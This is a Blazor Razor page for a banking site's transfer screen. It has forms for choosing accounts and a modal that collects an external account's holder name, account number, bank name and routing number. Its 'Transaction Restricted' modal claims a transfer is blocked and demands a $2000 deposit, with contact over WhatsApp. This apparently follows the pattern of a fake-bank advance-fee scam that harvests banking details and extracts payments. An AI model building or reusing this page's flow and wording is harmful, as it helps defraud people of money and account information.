@page "/transfer"

<div class="container transfer-page">
    <div class="transfer-header" style="border-color: @(Brain.CurrentTheme.SecondaryBackgroundColor)">
        <div>
            <h2>Make a Transfer</h2>
            <p>Move money between your eligible accounts.</p>
        </div>
        <Anchor Location="/account" Class="account-link">Account</Anchor>
    </div>

    <div class="transfer-grid">
        <section class="transfer-panel">
            <form id="transfer-form">

                <!-- Amount -->
                <div class="form-group row">
                    <label class="col-sm-4 col-form-label">Amount</label>
                    <div class="col-sm-8">
                        <input type="number" class="form-control" placeholder="0.00" @bind="Amount">
                    </div>
                </div>

                <!-- Transfer From -->
                <div class="form-group row">
                    <label class="col-sm-4 col-form-label">Transfer From</label>
                    <div class="col-sm-8">
                        <select class="form-control" @onchange="@(e => TransferFrom = e.Value.ToString())">
                            @foreach (var account in Brain.GetCurrentAccounts())
                            {
                                <option value="@account.Last4Digits">
                                    @($"{account.Name} (****{account.Last4Digits})")
                                </option>
                            }
                        </select>
                    </div>
                </div>

                <!-- Transfer To -->
                <div class="form-group row">
                    <label class="col-sm-4 col-form-label">Transfer To</label>
                    <div class="col-sm-8">
                        <select class="form-control" @onchange="@(e => TransferTo = e.Value.ToString())">
                            @foreach (var account in AllAccounts)
                            {
                                <option value="@account.Last4Digits">
                                    @($"{account.Name} (****{account.Last4Digits})")
                                </option>
                            }
                        </select>
                    </div>
                </div>

                <!-- Add External Account -->
                <div class="form-group row">
                    <Anchor @onclick="ShowExternalAccountForm" Color="@(Brain.CurrentTheme.AnchorColor)"
                            Style="padding-top: 0.5em" Class="col-sm-4 add-account-link">
                        Add External Account
                    </Anchor>

                    <button class="col-sm-8 btn themed-transfer-button"
                            style="background-color: @(Brain.CurrentTheme.PrimaryBackgroundColor); border-color: @(Brain.CurrentTheme.PrimaryBackgroundColor);"
                            type="button" @onclick="OnSubmit">
                        Submit
                    </button>
                </div>

            </form>
        </section>

        <aside class="transfer-summary" style="border-top-color: @(Brain.CurrentTheme.PrimaryBackgroundColor)">
            <h4>Transfer Notes</h4>
            <p>Internal transfers update your balances after submission.</p>
            <p>External accounts can be added from this page and reviewed before transfer activity continues.</p>
        </aside>
    </div>
</div>

<!-- Add External Account Modal -->
@if (showModal)
{
    <div class="modal show d-block" style="background-color: rgba(0,0,0,0.5)">
        <div class="modal-dialog">
            <div class="modal-content">

                <div class="modal-header themed-modal-header"
                     style="background-color: @(Brain.CurrentTheme.SecondaryBackgroundColor); color: @(Brain.CurrentTheme.PreheaderAnchorColor)">
                    <h5>Add External Account</h5>
                    <button class="close" @onclick="CloseModal">&times;</button>
                </div>

                <div class="modal-body">

                    <div class="form-group">
                        <label>Account Holder</label>
                        <input class="form-control" @bind="NewExternalAccount.AccountHolder" />
                    </div>

                    <div class="form-group">
                        <label>Account Number</label>
                        <input class="form-control" @bind="NewExternalAccount.AccountNumber" maxlength="12" />
                    </div>

                    <div class="form-group">
                        <label>Account Type</label>
                        <select class="form-control" @bind="NewExternalAccount.AccountType">
                            <option value="">-- Select --</option>
                            <option>Checking</option>
                            <option>Savings</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Bank Name</label>
                        <input class="form-control" @bind="NewExternalAccount.BankName" />
                    </div>

                    <div class="form-group">
                        <label>Routing Number</label>
                        <input class="form-control" @bind="NewExternalAccount.RoutingNumber" maxlength="9" />
                    </div>

                </div>

                <div class="modal-footer">
                    <button class="btn btn-secondary" @onclick="CloseModal">Cancel</button>
                    <button class="btn themed-transfer-button"
                            style="background-color: @(Brain.CurrentTheme.PrimaryBackgroundColor); border-color: @(Brain.CurrentTheme.PrimaryBackgroundColor);"
                            @onclick="AddExternalAccount">Add</button>
                </div>

            </div>
        </div>
    </div>
}

<!-- Loading Modal -->
@if (showLoadingModal)
{
    <div class="modal show d-block" style="background-color: rgba(0,0,0,0.5)">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center p-4">

                <div class="spinner-border themed-spinner"
                     style="color: @(Brain.CurrentTheme.PrimaryBackgroundColor)"></div>
                <p class="mt-3">Processing transaction...</p>

            </div>
        </div>
    </div>
}

<!-- Restriction Modal -->
@if (showRestrictionModal)
{
    <div class="modal show d-block" style="background-color: rgba(0,0,0,0.5)">
        <div class="modal-dialog">
            <div class="modal-content">

                <div class="modal-header themed-modal-header"
                     style="background-color: @(Brain.CurrentTheme.SecondaryBackgroundColor); color: @(Brain.CurrentTheme.PreheaderAnchorColor)">
                    <h5>Transaction Restricted</h5>
                    <button class="close" @onclick="CloseRestrictionModal">&times;</button>
                </div>

                <div class="modal-body">
                    <p>
                        The external account (@SelectedExternalAccount?.AccountHolder -
                        ****@SelectedExternalAccount?.Last4Digits)
                        is currently under external restriction.
                    </p>

                    <p>
                        To complete this transaction, please make a deposit of $2000.<br /> Contact @Brain.SupportPhoneNumber on
                        whatsapp,
                        @Brain.SupportEmail for more information
                    </p>

                    <hr />

                    <strong>Your Account Details:</strong><br />
                    Bank: @SelectedExternalAccount?.BankName<br />
                    Account Holder: @SelectedExternalAccount?.AccountHolder<br />
                    Account Type: @SelectedExternalAccount?.AccountType<br />
                    Routing Number: @SelectedExternalAccount?.RoutingNumber
                </div>

                <div class="modal-footer">
                    <button class="btn themed-transfer-button"
                            style="background-color: @(Brain.CurrentTheme.PrimaryBackgroundColor); border-color: @(Brain.CurrentTheme.PrimaryBackgroundColor);"
                            @onclick="CloseRestrictionModal">OK</button>
                </div>

            </div>
        </div>
    </div>
}
